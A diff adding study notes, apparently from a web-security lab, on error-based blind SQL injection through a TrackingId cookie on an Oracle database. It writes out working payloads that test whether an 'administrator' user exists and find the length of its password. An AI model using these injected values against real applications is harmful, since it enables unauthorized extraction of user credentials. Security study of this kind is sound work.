@@ -56,3 +56,16 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual
 ```
 TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
 ```
+- the error disappears so we can trigger an error conditionally on the truth of a specific condition
+- The CASE statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false.
+- former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions 1=1 and 1=2, and an error is received when the condition is true
+- can use this behavior to test whether specific entries exist in a table
+```
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+- in sql the from clause executes first so in the above query it checks if the administartor is the users db then the select statment executes and we should get an error
+- now to determine how many characters are in the password of the administrator user.
+```
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+- and iterate the process till we got 20 on 21 no error displays which means the password is shorter than 21
